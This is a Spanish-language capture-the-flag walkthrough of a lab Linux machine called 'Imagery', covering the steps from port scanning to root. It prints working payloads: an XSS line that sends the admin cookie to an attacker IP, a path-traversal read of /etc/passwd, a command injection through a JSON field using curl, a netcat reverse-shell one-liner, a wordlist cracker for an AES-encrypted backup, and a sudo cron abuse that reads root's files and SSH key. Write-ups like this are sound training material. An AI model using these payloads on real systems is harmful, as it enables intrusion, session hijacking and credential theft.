
# Imagery

<figure><img src="/files/ASZzjtRjtwUvoHvB93Wb" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Imagery`
* **IP:** `10.10.11.88`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `14-10-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.88 imagery.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.10.11.88
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos 2 puertos abiertos, destacando el puerto 8000 que corre un servidor Werkzeug.

#### Escaneo Avanzado

Podemos usar Visual Map con un escaneo en XML para detectar posibles vulnerabilidades o vectores de entrada:

```bash
sudo nmap -v -A 10.10.11.88 -oX scan.xml
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

### Análisis con Visual Map

{% embed url="<https://github.com/afsh4ck/Visual-Map>" %}

<figure><img src="/files/y7vpDPZ2jkW91lSRvg7D" alt=""><figcaption></figcaption></figure>

#### Resumen de Scripts NSE&#x20;

Este análisis de scripts NSE revela la presencia de dos servicios clave:

* Servicio SSH: Se identificaron claves de host ECDSA y ED25519, lo que confirma la ejecución de un servidor SSH.
* Servicio Web (HTTP)
* El servidor web soporta los métodos HTTP `OPTIONS`, `HEAD` y `GET`.
* El título de la página web es "Image Gallery".
* La tecnología subyacente del servidor es `Werkzeug/3.1.3` sobre `Python/3.12.7`.

### Acceso Web

Accedemos a [`http://10.10.11.88:8000/`](http://10.10.11.88:8000/) y observamos que parece ser una galería de fotos online. Nos registraremos para ver la aplicación web por dentro

<figure><img src="/files/bL67OPN6OAee5yHgxFBt" alt=""><figcaption></figcaption></figure>

Una vez dentro vemos que podemos subir una imagen, por lo que puede ser el vector de entrada principal:

<figure><img src="/files/vpoh8Dsfyn3GczbcfHpL" alt=""><figcaption></figcaption></figure>

### Prueba de subida de archivos

Después de probar multitud de técnicas de subidas de archivos, doble extensión de archivos, MYME Types, bypass de blacklists, etc... parece que no podemos ejecutar PHP de ninguna manera, por lo que este vector de entrada queda descartado en principio.

<figure><img src="/files/cJ14bIlEbhq16BzJURVi" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">XSS</mark>

Encontramos en el footer un apartado de la web que no habíamos visto antes, un apartado para reportar un bug.

<figure><img src="/files/UEXUFZOdkRdK4EMlukMo" alt=""><figcaption></figcaption></figure>

Curiosamente este apartado es vulnerable a XSS y conseguimos la cookie del administrador con el siguiente script:

```html
<img src=1 onerror="document.location='http://10.10.14.100:80/?c='+document.cookie">
```

Abrimos un servidor PHP por el puerto 80 y recibimos la cookie casi al instante. Tenemos que tener en cuenta que esta cookie es rotatoria y va cambiando cada cierto tiempo.

```shell-session
afsh4ck@kali$ sudo php -S 0.0.0.0:80

[Tue Oct 14 05:18:22 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
```

<figure><img src="/files/6pMXZEVAFaHq5kMxmYua" alt=""><figcaption></figcaption></figure>

Tenemos la cookie:

{% code overflow="wrap" %}

```
c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOzo2A.7XVtQ7-bk28X8Mo8ymB4xYZ8Rh4
```

{% endcode %}

<figure><img src="/files/Sj8BdWq84mftW9jiWRPm" alt=""><figcaption></figcaption></figure>

### Admin panel

Al editar la cookie y recargar la página vemos un panel de administración donde podemos descargarnos un log del usuario y el administrador de la web:

<figure><img src="/files/q2OkbWmpvJq92N9zaZgf" alt=""><figcaption></figcaption></figure>

El log no contiene nada interesante:

```bash
cat admin@imagery.htb.log 

[2025-10-13T12:00:09.151016] Logged in successfully.
[2025-10-13T12:00:09.164590] Logged in successfully.
[2025-10-13T12:01:09.098800] Logged in successfully.
[2025-10-13T12:02:08.818371] Logged in successfully.
[2025-10-13T12:02:08.841170] Logged in successfully.
```

### Local File Inclusion (LFI)

Al capturar el request de descarga de log, encontramos un parámetro log\_identifier que es vulnerable a LFI, permitiéndonos ver el contenido de archivos cómo el `etc/passwd`:

<pre><code><strong>GET /admin/get_system_log?log_identifier=../../../../../etc/passwd 
</strong></code></pre>

<figure><img src="/files/hremjEEiHTkjCP3GYqVD" alt=""><figcaption></figcaption></figure>

Encontramos un usuario `mark` con shell y que nos llama la atención.

#### Dumpeo de variables de entorno y usuario actual

<figure><img src="/files/Xm4rMCpPxHN5w7MQzLmC" alt=""><figcaption></figcaption></figure>

#### Credenciales de admin

Las credenciales del administrador y el usuario de prueba las encontramos en `db.json` en `config.py`, que es el archivo de configuración común junto con `app.py` en los servidores Python.

<figure><img src="/files/UnU0E49E4wo8tB9xhn5Z" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/ghxW9h5BF1248tZDZWcE" alt=""><figcaption></figcaption></figure>

```json
"users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
```

Las contraseñas tienen un formato de hash, por lo que vamos a crackearlas.

### Cracking de hashes

Solamente conseguimos crackear la contraseña del usuario de prueba: `iambatman`

<figure><img src="/files/arBUGx5jsTUP5vnDsiX6" alt=""><figcaption></figcaption></figure>

No podemos conectarnos directamente por SSH:

```bash
ssh testuser@imagery.htb

The authenticity of host 'imagery.htb (10.10.11.88)' can't be established.
ED25519 key fingerprint is SHA256:1f09NrF6QWI5nbZzSJJflV8ACTiH/pMDmhIFayf3VD4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:25: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'imagery.htb' (ED25519) to the list of known hosts.
testuser@imagery.htb: Permission denied (publickey).
```

Así que nos loguearemos directamente con su usuario en la web. Observamos que este usuario tiene desbloqueadas algunas funcionalidades que un usuario normal no tiene:

<figure><img src="/files/jkU3ry198pOLKDjeHJcF" alt=""><figcaption></figcaption></figure>

Por ejemplo al subir una imagen legítima y hacer click en las opciones de la imagen, vemos que ahora tenemos todas desbloqueadas, cuando antes solamente teníamos Download y Delete:

<figure><img src="/files/dxk8o5Dh3DVL094Va53I" alt=""><figcaption></figcaption></figure>

Hay una funcionalidad interesante de visual image transformation, con la que podemos transformar una imagen y pasa varios parámetros en un JSON:

<figure><img src="/files/B8492g4mwX8fncOEeWbO" alt=""><figcaption></figcaption></figure>

```json
"params":{
    "x":0,
    "y":0,
    "width":900,
    "height":515
}
```

### RCE a través de JSON

Le inyectaremos un comando en el primer valor para hacer la comprobación. Haremos un curl y intentaremos inyectar un comando de S.O. como whoami:

```json
"params":{
    "x":";curl http://10.10.14.100?output='whoami';",
    "y":0,
    "width":900,
    "height":515
}
```

<figure><img src="/files/B0ksHH53uJCYA9d6pEA2" alt=""><figcaption></figcaption></figure>

Recibimos el test en nuestra terminal, lo que significa que el input es vulnerable y podemos ganar una shell.

### Ganando la shell

Abrimos un listener de netcat en nuestro equipo atacante:

```bash
nc -nlvp 8888
```

Y usaremos el siguiente payload para devolvernos una conexión de netcat y ganar la shell:

```bash
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.100 8888 >/tmp/f; = on target
```

<figure><img src="/files/8Wi2CekOY6JtntX0v7H6" alt=""><figcaption></figcaption></figure>

Estamos dentro!

```bash
nc -nlvp 8888

listening on [any] 8888 ...
connect to [10.10.14.100] from (UNKNOWN) [10.10.11.88] 56144
sh: 0: can't access tty; job control turned off
$ whoami
web
```

#### Tratamiento de la TTY

Tenemos una shell limitada, por lo que haremos el tratamiento de la TTY para movernos mejor:

```shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'
web@Imagery:~/web$
```

***

## <mark style="color:purple;">Credential hunting</mark>

Buscaremos credenciales para seguir moviéndonos por el sistema.

{% content-ref url="/pages/zIfv10AYKkDbbaHf34TR" %}
[Credential Hunting - Linux](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/linux-attacks/credential-hunting-linux.md)
{% endcontent-ref %}

Encontramos un archivo de backup pero está cifrado:

```bash
cd var/backup

bash-5.2$ ls
web_20250806_120723.zip.aes
```

### Cracking de ZIP con cifrado AES

No podemos extraerlo directamente, así que ChatGPT me ha dado los pasos para conseguirlo:

Primero nos enviamos el archivo backup a nuestra máquina de atacante para trabajar mejor:

```bash
bash-5.2$ python3 -m http.server 9876
Serving HTTP on 0.0.0.0 port 9876 (http://0.0.0.0:9876/) ...
```

Nos lo descargamos en Kali:

```bash
wget http://10.10.11.88:9876/web_20250806_120723.zip.aes
```

Y ejecutamos lo siguiente:

```bash
python3 -m venv temp
source temp/bin/activate
pip install pyAesCrypt
python crack.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt
```

Por aquí dejo el script que nos servirá para crackear el zip.aes:

{% code title="crack.py" %}

```python
#!/usr/bin/env python3
import pyAesCrypt
import sys
import os

if len(sys.argv) < 3:
    print("Usage: python crack.py file.zip.aes wordlist.txt [outdir]")
    sys.exit(1)

encfile = sys.argv[1]
wordlist = sys.argv[2]
outdir = sys.argv[3] if len(sys.argv) > 3 else "attempt_out"
os.makedirs(outdir, exist_ok=True)

# chunk size used by pyAesCrypt (default value).
bufferSize = 64 * 1024

total = 0
with open(wordlist, "r", errors="ignore") as f:
    for line in f:
        pwd = line.rstrip("\n\r")
        if not pwd:
            continue
        total += 1
        if total % 1000 == 0:
            print(f"Attempt #{total}: '{pwd[:30]}'")
        outpath = os.path.join(outdir, "temp_decrypted_output")
        try:
            # pyAesCrypt.decryptFile throws ValueError on wrong password (or IntegrityError)
            pyAesCrypt.decryptFile(encfile, outpath, pwd, bufferSize)
            print()
            print("Password Cracked")
            print(pwd)
            print("Decrypted output saved to:", outpath)
            sys.exit(0)
        except (ValueError, Exception) as e:
            # Wrong password will generally raise ValueError / IntegrityError
            # Remove any incomplete file
            if os.path.exists(outpath):
                try:
                    os.remove(outpath)
                except:
                    pass
            # continue trying
            continue

print("Password NOT found in the provided wordlist.")
sys.exit(2)
```

{% endcode %}

Al ejecutarlo obtenemos una contraseña en plano: `bestfriends`

```bash
python crack.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt

Password Cracked
bestfriends
Decrypted output saved to: attempt_out/temp_decrypted_output
```

Extraemos el contenido de la carpeta generada:

```bash
unzip attempt_out/temp_decrypted_output
```

Al leer el archivo `db.json` del archivo de backup, esta vez si conseguimos el hash del usuario mark:

```bash
cat web/db.json
```

<figure><img src="/files/cVDw9qKz3EB55xty6sH6" alt=""><figcaption></figcaption></figure>

Y con crackstation lo crackeamos al instante:

<figure><img src="/files/zzZfeeWABCSoqyB4KHvG" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">User Flag</mark>

No podemos acceder por SSH, por lo que cambiaremos al usuario mark desde la propia shell que ya tenemos:

```bash
bash-5.2$ su mark
Password: supersmash

bash-5.2$ whoami
mark
```

Y por fin accedemos a la user flag:

```bash
bash-5.2$ cd /home/mark

bash-5.2$ ls
user.txt

bash-5.2$ cat user.txt
45e334738070b9da3439a17e********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

Tenemos permisos de ejecución como root en el ejecutable charcol:

```bash
bash-5.2$ sudo -l

Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Lo ejecutaremos para ver su comportamiento:

```bash
bash-5.2$ sudo charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                                                                                      
Charcol The Backup Suit - Development edition 1.0.0

Charcol is already set up.
To enter the interactive shell, use: charcol shell
```

Al iniciar la shell de charcol nos pide una contraseña:

```bash
bash-5.2$ sudo charcol shell
sudo charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password): 
```

Probamos todas las contraseñas que tenemos hsta ahora pero no funcionan, pero podemos resetearlo con la flag -R:

```bash
bash-5.2$ sudo charcol -R

Attempting to reset Charcol application password to default.
[2025-10-13 22:53:41] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 
supersmash                                                  

[2025-10-13 22:54:09] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

Ahora ya no pedirá contraseña al ejecutarlo:

```
bash-5.2$ sudo charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██                                               
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-13 22:58:53] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> 
```

Con el comando `help` vemos todo lo que podemos hacer con Charcol:

```bash
auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
```

### Obtener la Root Flag con Charcol

Usaremos el siguiente comando de charcol para copiar la root flag a nuestro directorio principal de mark:

```bash
charcol> auto add --schedule "* * * * *" --command "cat /root/root.txt > /home/.flag" --name "root_flag" --log-output /home/.flag

<.flag2" --name "root_flag" --log-output /home/.flag
[2025-10-13 23:04:36] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 
supersmash

[2025-10-13 23:04:44] [INFO] System password verified successfully.
[2025-10-13 23:04:44] [INFO] Auto job 'root_flag' (ID: 7b9f116a-17b1-4184-a4fa-f7d9ed832df5) added successfully. The job will run according to schedule.
[2025-10-13 23:04:44] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true cat /root/root.txt > /home/.flag2 >> /home/.flag 2>&1
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

En el directorio home nos encontramos la flag de root:

```bash
bash-5.2$ ls -la

total 20
drwxr-xr-x  4 root root 4096 Oct 13 23:05 .
drwxr-xr-x 20 root root 4096 Sep 22 19:10 ..
-rw-r--r--  1 root root  198 Oct 13 23:10 .flag
drwxr-x---  2 mark mark 4096 Sep 22 18:56 mark
drwxr-x---  7 web  web  4096 Sep 22 18:56 web

bash-5.2$ cat .flag
8277d5fb5ed2084c53cd563a********
```

Podríamos hacer lo mismo para conseguir el `id_rsa` de root (si lo tiene) y acceder por SSH para un control total del sistema:

```bash
auto add --schedule "* * * * *" --command "cat /root/.ssh/id_rsa > /home/.ssh" --name "id_rsa" --log-output /home/.ssh
```
